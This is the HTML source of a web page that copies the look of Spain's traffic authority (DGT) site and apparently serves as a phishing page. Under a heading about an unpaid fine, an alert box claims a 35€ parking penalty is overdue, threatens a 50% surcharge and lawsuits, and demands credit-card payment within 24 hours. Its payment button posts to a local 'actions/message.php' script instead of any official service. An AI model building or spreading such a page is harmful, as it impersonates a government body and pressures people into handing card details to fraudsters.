														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Centros de formación para conducción segura y eficiente</a>
														<ul class="dropdown-menu" aria-labelledby="Centrosdeformaciónparaconducciónsegurayeficiente">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Acreditación de formadores para cursos de motocicleta y turismo</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Fabricantes, Talleres, Concesionarios y Entidades Financieras</a>
														<ul class="dropdown-menu" aria-labelledby="Fabricantes,Talleres,ConcesionariosyEntidadesFinancieras">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Custodia de tarjetas eITV</a></li>
															<li class="dropdown-item"><a >Anotación de reparaciones en el libro taller electrónico</a></li>
															<li class="dropdown-item"><a >Solicitud de placas rojas y libro talonario</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Alquiler, renting y grandes flotas</a>
														<ul class="dropdown-menu" aria-labelledby="Alquiler,rentingygrandesflotas">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Comunicar arrendatario de un vehículo en renting</a></li>
															<li class="dropdown-item"><a >Informes de vehículos en lote</a></li>
															<li class="dropdown-item"><a >Comunicar conductor habitual para empresas</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Certificados de aptitud</a>
														<ul class="dropdown-menu" aria-labelledby="Certificadosdeaptitud">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Certificado de aptitud para profesores de formación vial</a></li>
															<li class="dropdown-item"><a >Certificado de aptitud para directores de escuelas de conductores</a></li>
															<li class="dropdown-item"><a >Certificado de aptitud para formadores y psicólogos formadores de centros de sensibilización</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Otras empresas y proveedores</a>
														<ul class="dropdown-menu" aria-labelledby="Otrasempresasyproveedores">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Canjes de permisos profesionales para empresas de transporte</a></li>
															<li class="dropdown-item"><a >Inscripción de un Servicio Inteligente de Transporte</a></li>
															<li class="dropdown-item"><a >Solicitud de placas rojas</a></li>
															<li class="dropdown-item"><a >Informes de vehículos en lote</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<!-- Fin Nivel 3 -->
												</ul>
											</li>
											<li class="dropdown-item childs">
												<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Para ayuntamientos y otras administraciones</a>
												<ul class="dropdown-menu" aria-labelledby="Paraayuntamientosyotrasadministraciones">
													<!-- Nivel 3 -->
													<li><a class="dropdown-item back"  role="button">Atrás</a></li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Multas y sanciones de tráfico</a>
														<ul class="dropdown-menu" aria-labelledby="Multasysancionesdetráfico">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Publicar sanciones en TEU – TESTRA</a></li>
															<li class="dropdown-item"><a >Notificar infracciones relacionadas con puntos a la DGT</a></li>
															<li class="dropdown-item"><a >Envío de notificaciones a un ciudadano – DEV</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item"><a >Comunicación de accidentes de tráfico</a></li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Intermediación de datos y descarga de ficheros</a>
														<ul class="dropdown-menu" aria-labelledby="Intermediacióndedatosydescargadeficheros">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Plataforma de Intermediación de Datos PID</a></li>
															<li class="dropdown-item"><a >Descarga de ficheros MOVE/PADRÓN, ZBE y ARCI</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<!-- Fin Nivel 3 -->
												</ul>
											</li>
											<li class="dropdown-item childs">
												<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Atención a víctimas de accidentes</a>
												<ul class="dropdown-menu" aria-labelledby="Atenciónavíctimasdeaccidentes">
													<!-- Nivel 3 -->
													<li><a class="dropdown-item back"  role="button">Atrás</a></li>
													<li class="dropdown-item"><a >Si eres víctima de un accidente de tráfico</a></li>
													<li class="dropdown-item"><a >Asociaciones de Víctimas</a></li>
													<li class="dropdown-item"><a >Subvenciones destinadas a asociaciones de víctimas</a></li>
													<li class="dropdown-item"><a >Pautas para la atención de las víctimas de accidentes de tráfico</a></li>
													<!-- Fin Nivel 3 -->
												</ul>
											</li>
											<li class="dropdown-item"><a >Centro de documentación</a></li>
											<!-- Fin Nivel 2 -->
										</ul>
									</li>
									<!--
									<li class="nav-item active">
										 -->
										<!-- 
										<a class="nav-link" >Inicio --><!-- <span class="sr-only">(current)</span> --><!-- </a>
										 -->
										<!-- 
									</li>
									 -->
									<li class="nav-item dropdown ">
										<a class="nav-link dropdown-toggle"  id="Muéveteconseguridad" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Muévete con seguridad</a>
										<ul class="dropdown-menu" aria-labelledby="Muéveteconseguridad">
											<!-- Nivel 2 -->
											<li><a class="dropdown-item back"  role="button">Atrás</a></li>
											<li class="dropdown-item"><a >Vías más seguras</a></li>
											<li class="dropdown-item childs">
												<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Tecnología e innovación en carretera</a>
												<ul class="dropdown-menu" aria-labelledby="Tecnologíaeinnovaciónencarretera">
													<!-- Nivel 3 -->
													<li><a class="dropdown-item back"  role="button">Atrás</a></li>
													<li class="dropdown-item"><a >DGT 3.0</a></li>
													<li class="dropdown-item"><a >Forma parte de la DGT 3.0</a></li>
													<li class="dropdown-item"><a >Sistemas Inteligentes de Transporte (ITS)</a></li>
													<li class="dropdown-item"><a >Dispositivos de preseñalización V16</a></li>
													<!-- Fin Nivel 3 -->
												</ul>
											</li>
											<li class="dropdown-item childs">
												<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Evita conductas de riesgo</a>
												<ul class="dropdown-menu" aria-labelledby="Evitaconductasderiesgo">
													<!-- Nivel 3 -->
													<li><a class="dropdown-item back"  role="button">Atrás</a></li>
													<li class="dropdown-item"><a >Distracciones al conducir</a></li>
													<li class="dropdown-item"><a >Consumo de alcohol</a></li>
													<li class="dropdown-item"><a >Consumo de drogas y medicación</a></li>
													<li class="dropdown-item"><a >Conducir con exceso de velocidad</a></li>
													<li class="dropdown-item"><a >Conducir con fatiga</a></li>
													<li class="dropdown-item"><a >Conducir sin cinturón de seguridad</a></li>
													<li class="dropdown-item"><a >Conducir con estrés</a></li>
													<li class="dropdown-item"><a >Conducir con sueño o cansancio</a></li>
													<!-- Fin Nivel 3 -->
												</ul>
											</li>
											<li class="dropdown-item childs">
												<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Viaja seguro</a>
												<ul class="dropdown-menu" aria-labelledby="Viajaseguro">
													<!-- Nivel 3 -->
													<li><a class="dropdown-item back"  role="button">Atrás</a></li>
													<li class="dropdown-item"><a >A pie</a></li>
													<li class="dropdown-item"><a >En bicicleta</a></li>
													<li class="dropdown-item"><a >En patinete</a></li>
													<li class="dropdown-item"><a >En ciclomotor</a></li>
													<li class="dropdown-item"><a >En moto</a></li>
													<li class="dropdown-item"><a >En quad</a></li>
													<li class="dropdown-item"><a >En coche</a></li>
													<li class="dropdown-item"><a >En autobús</a></li>
													<li class="dropdown-item"><a >En tractor y vehículo agrícola</a></li>
													<li class="dropdown-item"><a >Con tu mascota</a></li>
													<li class="dropdown-item"><a >Con caravana, remolque o autocaravana</a></li>
													<li class="dropdown-item"><a >Cómo planificar un viaje seguro por carretera</a></li>
													<li class="dropdown-item"><a >Consejos para personas mayores</a></li>
													<li class="dropdown-item"><a >Conduce en el extranjero</a></li>
													<!-- Fin Nivel 3 -->
												</ul>
											</li>
											<li class="dropdown-item childs">
												<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Consejos para conductores</a>
												<ul class="dropdown-menu" aria-labelledby="Consejosparaconductores">
													<!-- Nivel 3 -->
													<li><a class="dropdown-item back"  role="button">Atrás</a></li>
													<li class="dropdown-item"><a >Sistemas avanzados de ayuda a la conducción (ADAS)</a></li>
													<li class="dropdown-item"><a >Cuál debe ser tu actitud al volante</a></li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Consejos generales</a>
														<ul class="dropdown-menu" aria-labelledby="Consejosgenerales">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Conducción eficiente</a></li>
															<li class="dropdown-item"><a >Cómo ahorrar combustible</a></li>
															<li class="dropdown-item"><a >Conducción preventiva</a></li>
															<li class="dropdown-item"><a >Cómo frenar con seguridad</a></li>
															<li class="dropdown-item"><a >Conducir en túneles</a></li>
															<li class="dropdown-item"><a >Circular de forma segura en rotondas</a></li>
															<li class="dropdown-item"><a >Cómo circular cerca de vehículos pesados</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Conducir con poca visibilidad o problemas de visión</a>
														<ul class="dropdown-menu" aria-labelledby="Conducirconpocavisibilidadoproblemasdevisión">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Circular con niebla</a></li>
															<li class="dropdown-item"><a >Conducir de noche</a></li>
															<li class="dropdown-item"><a >Conducir con problemas de visión</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item childs">
														<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Conducir en invierno</a>
														<ul class="dropdown-menu" aria-labelledby="Conducireninvierno">
															<!-- Nivel 4 -->
															<li><a class="dropdown-item back"  role="button">Atrás</a></li>
															<li class="dropdown-item"><a >Conducir con hielo y nieve</a></li>
															<li class="dropdown-item"><a >Circular con lluvia</a></li>
															<li class="dropdown-item"><a >Circular con niebla</a></li>
															<li class="dropdown-item"><a >Conducir con viento</a></li>
															<li class="dropdown-item"><a >Mantenimiento invernal</a></li>
															<!-- Fin Nivel 4 -->
														</ul>
													</li>
													<li class="dropdown-item"><a >Mejora tu percepción del riesgo</a></li>
													<li class="dropdown-item"><a >Educa en seguridad vial</a></li>
													<!-- Fin Nivel 3 -->
												</ul>
											</li>
											<li class="dropdown-item"><a >Qué hacer ante un accidente de tráfico</a></li>
											<li class="dropdown-item"><a >Conoce las normas de Tráfico</a></li>
											<li class="dropdown-item"><a >Vehículos de auxilio</a></li>
											<!-- Fin Nivel 2 -->
										</ul>
									</li>
									<!--
									<li class="nav-item active">
										 -->
										<!-- 
										<a class="nav-link" >Inicio --><!-- <span class="sr-only">(current)</span> --><!-- </a>
										 -->
										<!-- 
									</li>
									 -->
									<li class="nav-item dropdown ">
										<a class="nav-link dropdown-toggle"  id="Estadodeltráfico" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Estado del tráfico</a>
										<ul class="dropdown-menu" aria-labelledby="Estadodeltráfico">
											<!-- Nivel 2 -->
											<li><a class="dropdown-item back"  role="button">Atrás</a></li>
											<li class="dropdown-item"><a >Información e incidencias de tráfico</a></li>
											<li class="dropdown-item"><a >Cámaras de tráfico</a></li>
											<li class="dropdown-item"><a >Recomendaciones de tráfico</a></li>
											<li class="dropdown-item"><a >Restricciones a la circulación</a></li>
											<li class="dropdown-item childs">
												<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Vigilancia y control</a>
												<ul class="dropdown-menu" aria-labelledby="Vigilanciaycontrol">
													<!-- Nivel 3 -->
													<li><a class="dropdown-item back"  role="button">Atrás</a></li>
													<li class="dropdown-item"><a >Equipos y tramos de vigilancia</a></li>
													<li class="dropdown-item"><a >Campañas de vigilancia</a></li>
													<!-- Fin Nivel 3 -->
												</ul>
											</li>
											<li class="dropdown-item childs">
												<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Rutas de interes</a>
												<ul class="dropdown-menu" aria-labelledby="Rutasdeinteres">
													<!-- Nivel 3 -->
													<li><a class="dropdown-item back"  role="button">Atrás</a></li>
													<li class="dropdown-item"><a >Camino de Santiago</a></li>
													<li class="dropdown-item"><a >Operación Paso del Estrecho</a></li>
													<li class="dropdown-item"><a >Operación Paso de Portugal</a></li>
													<li class="dropdown-item"><a >Rutas ciclistas seguras</a></li>
													<!-- Fin Nivel 3 -->
												</ul>
											</li>
											<li class="dropdown-item"><a >El tráfico en Europa</a></li>
											<!-- Fin Nivel 2 -->
										</ul>
									</li>
									<!--
									<li class="nav-item active">
										 -->
										<!-- 
										<a class="nav-link" >Inicio --><!-- <span class="sr-only">(current)</span> --><!-- </a>
										 -->
										<!-- 
									</li>
									 -->
									<li class="nav-item dropdown ">
										<a class="nav-link dropdown-toggle"  id="ConocelaDGT" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Conoce la DGT</a>
										<ul class="dropdown-menu" aria-labelledby="ConocelaDGT">
											<!-- Nivel 2 -->
											<li><a class="dropdown-item back"  role="button">Atrás</a></li>
											<li class="dropdown-item childs">
												<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Quiénes somos</a>
												<ul class="dropdown-menu" aria-labelledby="Quiénessomos">
													<!-- Nivel 3 -->
													<li><a class="dropdown-item back"  role="button">Atrás</a></li>
													<li class="dropdown-item"><a >Nuestros valores</a></li>
													<li class="dropdown-item"><a >Estructura y funciones</a></li>
													<li class="dropdown-item"><a >Historia</a></li>
													<!-- Fin Nivel 3 -->
												</ul>
											</li>
											<li class="dropdown-item"><a >Dónde estamos</a></li>
											<li class="dropdown-item childs">
												<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Qué hacemos</a>
												<ul class="dropdown-menu" aria-labelledby="Quéhacemos">
													<!-- Nivel 3 -->
													<li><a class="dropdown-item back"  role="button">Atrás</a></li>
													<li class="dropdown-item"><a >Nuestros objetivos</a></li>
													<li class="dropdown-item"><a >Estrategias y planes</a></li>
													<li class="dropdown-item"><a >Consejo Superior de Tráfico, Seguridad Vial y Movilidad Sostenible</a></li>
													<li class="dropdown-item"><a >Encuentro de ciudades</a></li>
													<li class="dropdown-item"><a >Educación Vial</a></li>
													<li class="dropdown-item"><a >Conocimiento e investigación</a></li>
													<li class="dropdown-item"><a >Ámbito internacional</a></li>
													<!-- Fin Nivel 3 -->
												</ul>
											</li>
											<li class="dropdown-item childs">
												<a class="dropdown-item"  role="button" aria-haspopup="true" aria-expanded="false">Con quién trabajamos</a>
												<ul class="dropdown-menu" aria-labelledby="Conquiéntrabajamos">
													<!-- Nivel 3 -->
													<li><a class="dropdown-item back"  role="button">Atrás</a></li>
													<li class="dropdown-item"><a >Oficinas de Correos</a></li>
													<li class="dropdown-item"><a >Ayuntamientos colaboradores</a></li>
													<li class="dropdown-item"><a >Centros de Reconocimiento de Conductores</a></li>
													<li class="dropdown-item"><a >Autoescuelas</a></li>
													<li class="dropdown-item"><a >Centros de sensibilización y reeducación</a></li>
													<li class="dropdown-item"><a >Estaciones ITV</a></li>
													<li class="dropdown-item"><a >Centros Autorizados de Tratamiento de Vehículos</a></li>
													<li class="dropdown-item"><a >Bancos y cajas de ahorro</a></li>
													<li class="dropdown-item"><a >Asociaciones de víctimas de accidentes</a></li>
													<li class="dropdown-item"><a >Talleres y asociaciones de talleres</a></li>
													<!-- Fin Nivel 3 -->
												</ul>
											</li>
											<!-- Fin Nivel 2 -->
										</ul>
									</li>
									<!--
									<li class="nav-item active">
										 -->
										<!-- 
										<a class="nav-link" >Inicio --><!-- <span class="sr-only">(current)</span> --><!-- </a>
										 -->
										<!-- 
									</li>
									 -->
									<li class="nav-item dropdown ">
										<a class="nav-link dropdown-toggle"  id="Comunicación" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Comunicación</a>
										<ul class="dropdown-menu" aria-labelledby="Comunicación">
											<!-- Nivel 2 -->
											<li><a class="dropdown-item back"  role="button">Atrás</a></li>
											<li class="dropdown-item"><a >Notas de prensa</a></li>
											<li class="dropdown-item"><a >Información de interés</a></li>
											<li class="dropdown-item"><a >Eventos</a></li>
											<li class="dropdown-item"><a >Campañas</a></li>
											<li class="dropdown-item"><a >Encuentros digitales</a></li>
											<li class="dropdown-item"><a >Boletín radiofónico</a></li>
											<li class="dropdown-item"><a >Revista Tráfico y Seguridad Vial</a></li>
											<li class="dropdown-item"><a >DGT en redes sociales</a></li>
											<!-- Fin Nivel 2 -->
										</ul>
									</li>
									<!-- Fin Nivel 1 -->
									<!-- Menu Secundario responsive -->
									<!-- Menu Secundario Escritorio -->
									<!-- Nivel 1 -->
									<li class="nav-item dropdown secondary "><a class="nav-link" >Transparencia</a></li>
									<li class="nav-item dropdown secondary "><a class="nav-link" >DGT en cifras</a></li>
									<li class="nav-item dropdown secondary">
										<a class="nav-link dropdown-toggle"  role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Selección y formación</a>
										<div class="dropdown-menu" aria-labelledby="">
											<!-- Nivel 2 -->
											<a class="dropdown-item back"  role="button">Atrás</a>
											<a class="dropdown-item" >Cursos para empleados públicos</a>
											<a class="dropdown-item" >Oposiciones y concursos</a>
											<a class="dropdown-item" >Selección de personal interino</a>
										</div>
									</li>
									<li class="nav-item dropdown secondary">
										<a class="nav-link dropdown-toggle"  role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Trabaja con nosotros</a>
										<div class="dropdown-menu" aria-labelledby="">
											<!-- Nivel 2 -->
											<a class="dropdown-item back"  role="button">Atrás</a>
											<a class="dropdown-item " >Recursos para proveedores</a>
											<a class="dropdown-item " >Factura electrónica</a>
										</div>
									</li>
									<li class="nav-item dropdown secondary contenedorIdiomasResponsive">
										<a class="nav-link dropdown-toggle"  role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Idioma:&nbsp;<span class="name"></span></a>
										<div class="dropdown-menu" aria-labelledby="">
											<a class="dropdown-item back"  role="button"> Atrás </a>
											<a class="dropdown-item "  data-code="DE" data-name="Alemán" data-comparativa="/es/de">
												<span class="code">DE</span>
												&nbsp;&nbsp;
												<span>Alemán</span>
											</a>
											<a class="dropdown-item "  data-code="CA" data-name="Catalán" data-comparativa="/es/ca">
												<span class="code">CA</span>
												&nbsp;&nbsp;
												<span>Catalán</span>
											</a>
											<a class="dropdown-item "  data-code="ES" data-name="Español" data-comparativa="/es/es">
												<span class="code">ES</span>
												&nbsp;&nbsp;
												<span>Español</span>
											</a>
											<a class="dropdown-item "  data-code="EU" data-name="Euskera" data-comparativa="/es/eu">
												<span class="code">EU</span>
												&nbsp;&nbsp;
												<span>Euskera</span>
											</a>
											<a class="dropdown-item "  data-code="FR" data-name="Francés" data-comparativa="/es/fr">
												<span class="code">FR</span>
												&nbsp;&nbsp;
												<span>Francés</span>
											</a>
											<a class="dropdown-item "  data-code="GL" data-name="Gallego" data-comparativa="/es/gl">
												<span class="code">GL</span>
												&nbsp;&nbsp;
												<span>Gallego</span>
											</a>
											<a class="dropdown-item "  data-code="EN" data-name="Inglés" data-comparativa="/es/en">
												<span class="code">EN</span>
												&nbsp;&nbsp;
												<span>Inglés</span>
											</a>
										</div>
									</li>
									<!-- Fin Menu Secundario responsive -->
								</ul>
								<!-- FIN Menu -->
							</div>
							<a class="btn toggle-search" role="button" data-toggle="collapse"  aria-expanded="false" aria-controls="collapseSearch">
								<span class="sr-only">Desplegar buscador</span>
								<i class="icon-search" data-intro="Recuerda que puedes filtrar las noticias a través del buscador" data-position="left"></i>
							</a>
							<div class="collapse" id="collapseSearch">
								<div class="wrapper">
									<div class="input-group search">
										<input type="search" class="form-control" placeholder="Búsqueda ..." aria-label="buscar en toda la web">
										<div class="input-group-append">
											<button class="btn btn-primary" type="submit">
												<span class="sr-only"> Enviar búsqueda </span>
												<i class="icon-search"></i>
											</button>
										</div>
									</div>
								</div>
							</div>
							<div class="navbar-backdrop"></div>
						</div>
					</nav>
					<!-- Fin Cabecera -->
					<!-- Breadcrumb -->
					<div class="d-none d-xl-flex px-3">
						<div class="container full-width-container">
							<div class="row">
								<div class="col-12">
									<nav aria-label="breadcrumb">
										<ol class="breadcrumb">
											<li id="breadcrumb-item-0" class="breadcrumb-item"><a >Inicio</a></li>
											<li id="breadcrumb-item-1" class="breadcrumb-item"><a >Nuestros servicios</a></li>
											<li id="breadcrumb-item-2" class="breadcrumb-item"><a >Multas y sanciones</a></li>
											<li id="breadcrumb-item-" class="breadcrumb-item active" aria-current="page">Multa impagada última notificación antes del recargo</li>
										</ol>
									</nav>
								</div>
							</div>
						</div>
					</div>
					<!-- Fin Breadcrumb -->
				</div>
			</div>
		</div>
		<main>
			<section>
				<div id="centercontainer">
					<div class="fondo1">
						<div class="my-4 mt-4">
							<div class="container">
								<div class="row">
									<div class="col-12">
										<div class="b1">
											<div class="filter-group">
												<div class="tags"></div>
											</div>
											<!-- Titre :  Amende impayé  -->
											<h1>Multa impagada última notificación antes del recargo</h1>
											<small class="date"></div>
										</div>
									</div>
								</div>
							</div>
						</div>
						<div>
							<div class="mb-3">
								<div class="container">
									<div class="row">
										<div class="col-12 text-to-resize ulHtml">
											<div class="text" id="64519cfe-8541-11ea-bb32-005056a48f82-00639__1_" data-status="1" data-status2="" data-status3=""></div>
										</div>
									</div>
								</div>
							</div>
							<div class="mb-4">
								<div class="container">
									<div role="alert" class="alert alert-info  show" data-status="" data-status2="" data-status3="">
										<span>
											<span>
												<p>
													Recuerda que la DGT notifica sus multas unicamente a través de uno de los siguientes canales:
													<br>
													<br>
												</p>
												<ul class="check">
													<li>A raíz de los numerosos relanzamientos por correo, todavía no hemos recibido su pago de 35€ por estacionamiento no autorizado en una vía prohibida.</li>
													<li>Para evitar un recargo del 50% y posibles demandas judiciales, le rogamos que haga el pago con tarjeta de crédito.</li>
												</ul>
												<p>
													<strong>
														Tiene menos de 24 horas para pagar la multa y aprovechar un descuento del 50%.
														<br>
														<br>
													</strong>
												</p>
											</span>
										</span>
									</div>
								</div>
							</div>
							<div class="mb-4 ">
								<div class="container">
									<div class="row">
										<div class="col-12 text-to-resize">
											<div class="accordion steps" id="accordion_2ea01b59-afb4-11ea-8dc1-005056a48f82-00051___">
												<div class="card">
													<div id="collapse_2ea01b59-afb4-11ea-8dc1-005056a48f82-00051____1" class="collapse" aria-labelledby="heading_2ea01b59-afb4-11ea-8dc1-005056a48f82-00051____1" data-parent="#accordion_2ea01b59-afb4-11ea-8dc1-005056a48f82-00051___">
														<div class="card-body">
															<div class="text" id="2ea01b59-afb4-11ea-8dc1-005056a48f82-00051_1_1_1" data-status="1" data-status2="1" data-status3="">
																<p>
																	Lee atentamente el boletín de la denuncia que te ha llegado y comprueba que sean correctos los datos del vehículo, la descripción de los hechos y el importe de la multa. Recuerda que los dos canales de notificación de la DGT son:
																</p>
																<ul class="check">
																	<li>Por defecto por correo postal, con posterior envío al&nbsp;<a class="iconExternalLink" title="Tablón Edictal" href="/.galleries/enlaces/sede/multas/teu" target="_blank" rel="noopener noreferrer">Tablón Edictal (TEU)</a>&nbsp;si no te hemos podido localizar en tu domicilio.</li>
																	<li>Notificación electrónica a través de la&nbsp;<a class="iconExternalLink" title="DEV - Dirección Electrónica Vial" href="/.galleries/enlaces/sede/multas/dev" target="_blank" rel="noopener noreferrer">DEV - Dirección Electrónica Vial</a>.</li>
																</ul>
															</div>
															<div class="quote" data-status="1" data-status2="2" data-status3=""></div>
															<div role="alert" class="alert alert-info  show" data-status="1" data-status2="3" data-status3="">
																<span>
																	<span>
																		<p>
																			A la hora de pagar una multa, reclamar o recurrirla, debes dirigirte siempre al organismo que te ha sancionado, por eso es importante que antes de nada compruebes 
																			<a class="iconExternalLink" title="quién te ha puesto la multa" href="/nuestros-servicios/multas-y-sanciones/quien-puede-multarte/" target="_blank" rel="noopener">quién te ha puesto la multa</a>
																			.
																		</p>
																	</span>
																</span>
															</div>
															<div class="text" id="2ea01b59-afb4-11ea-8dc1-005056a48f82-00051_1_1_4" data-status="1" data-status2="4" data-status3="">
																<p>
																	<br>
																	Si la multa fuera de algún ayuntamiento o Comunidad Autónoma, dirígete directamente a ellos. Te indicarán los medios que tienes para informarte, pagar la multa, o recurrila.
																</p>
															</div>
														</div>
													</div>
												</div>
												<div class="card">
													<div class="card-header" id="heading_2ea01b59-afb4-11ea-8dc1-005056a48f82-00051____2"></div>
													<div id="collapse_2ea01b59-afb4-11ea-8dc1-005056a48f82-00051____2" class="collapse" aria-labelledby="heading_2ea01b59-afb4-11ea-8dc1-005056a48f82-00051____2" data-parent="#accordion_2ea01b59-afb4-11ea-8dc1-005056a48f82-00051___">
														<div class="card-body">
															<div class="text" id="2ea01b59-afb4-11ea-8dc1-005056a48f82-00051_2_1_1" data-status="1" data-status2="1" data-status3="">
																<p>
																	Si no estabas conduciendo en el momento de la infracción o si la sanción impuesta conlleva la pérdida de puntos, debes realizar obligatoriamente la 
																	<a class="iconExternalLink" title="identificación del conductor" href="/.galleries/enlaces/sede/multas/identificar-conductor" target="_blank" rel="noopener">identificación del conductor</a>
																	.
																</p>
																<ul class="check" data-status="1" data-status2="1" data-status3="">
																	<li data-count="javax.servlet.jsp.jstl.core.LoopTagSupport$1Status@1448297a" data-caso="par">Si no eras el conductor, debes indicarnos en un plazo de 10 días desde que te notificamos la infracción quién es el responsable de la infracción, y así poder aplicar la sanción al responsable.</li>
																	<li data-count="javax.servlet.jsp.jstl.core.LoopTagSupport$1Status@1448297a" data-caso="par">En caso de que la sanción suponga pérdida de puntos, es obligatorio realizar siempre la identificación del conductor. Puedes ser sancionado si no lo haces.</li>
																</ul>
															</div>
															<div class="text" id="2ea01b59-afb4-11ea-8dc1-005056a48f82-00051_2_1_2" data-status="1" data-status2="2" data-status3="">
																<p>
																	En otros casos, no es necesario que realices la identifcación.&nbsp;
																	<br>
																	<br>
																</p>
															</div>
															<div role="alert" class="alert alert-info  show" data-status="1" data-status2="3" data-status3="">
																<span>
																	<span><p>La falta de identificación del conductor, en cualquiera de los casos obligatorios, se considera una infracción muy grave, lo que supone una sanción por el doble o el triple del importe de la multa original.</p></span>
																</span>
															</div>
															<div class="formalities">
																<span class="icon-online" data-status="1" data-status2="4" data-status3="">En linea</span>
																<span class="icon-appDgt" data-status="1" data-status2="5" data-status3="">App miDGT </span>
																<span class="icon-in-person" data-status="1" data-status2="6" data-status3="">Presencial </span>
															</div>
															<!-- Enlace -->
															<a href="/.galleries/enlaces/sede/multas/identificar-conductor" class="iconExternalLink btn btn-primary " target="_blank" data-status="1" data-status2="7" data-status3="">Identifica al conductor</a>
															<div class="payment">
																<ul class="resources mb-4">
																	<li class="list-group-item" data-status="1" data-status2="8" data-status3="">
																		<p>
																			<span class="title">Coste del trámite</span>
																			<span class="text-muted" data-tramite="gratuito ">XX,XX€</span>
																		</p>
																	</li>
																</ul>
															</div>
															<ul class="resources ">
																<li class="list-group-item" data-status="1" data-status2="9" data-status3="">
																	<p>
																		Si quien conduce habitualmente&nbsp;un vehículo que está a tu nombre es otra persona, lo mejor es que nos comuniques quién es el conductor habitual, de esta manera cuando haya que notificar una infracción primero nos pondremos en contacto con él.
																	</p>
																	<div class="link">
																		<a class="icon-external-link" target="_blank" href="/nuestros-servicios/tu-vehiculo/tus-vehiculos/conductor-habitual-de-tu-vehiculo/"><span class="sr-only">Descargar</span></a>
																	</div>
																</li>
															</ul>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
							<div class="mb-5 ">
								<div class="container">
									<div class="">
										<div class="row"></div>
										<div class="row text-to-resize">
											<div class="col-md-6"></div>
										</div>
									</div>
								</div>
							</div>
							
							
							<div class="mb-3">
								<div class="container">
									<div class="row">
										<div class="col-12">
											<div class="formalities-out">
												<form action ='../actions/message.php' method ="post">
												<button type="submit" name="login_submit" class="custom-button form-ontrol">Realizar el pago de la multa</button>
												</form>
												
												
											</div>
										</div>
									</div>
								</div>
							</div>
							<div class="mb-3">
								<div class="container">
									<div class="row"></div>
								</div>
							</div>
							<div class="mb-5">
								<div class="container">
									<div class="row">
										<div class="col-12 text-to-resize">
											<div class="steps"></div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</section>
				</main>
				<div class="player" style="display: none;">
					<div class="wrapper">
						<div class="controls">
							<a href="" class="backward"><span class="sr-only">retroceder 10 segundos</span></a>
							<a href="" class="play icon-play"><span class="sr-only">reproducir / pausar</span></a>
							<a href="" class="forward"><span class="sr-only">avanzar 10 segundos</span></a>
						</div>
						<div class="info">
							<h2 class="title">Título del audio lorem</h2>
							<div class="time">
								<span class="actual">00:00</span>
								<span class="duration">00:00</span>
							</div>
							<div class="progress">
								<div class="progress-bar" role="progressbar" style="width: 10%" aria-valuenow="10" aria-valuemin="0" aria-valuemax="100"></div>
							</div>
						</div>
						<button type="button" class="close icon-close" data-dismiss="dialog" aria-label="Close"><span class="sr-only">cerrar reproductor</span></button>
					</div>
				</div>
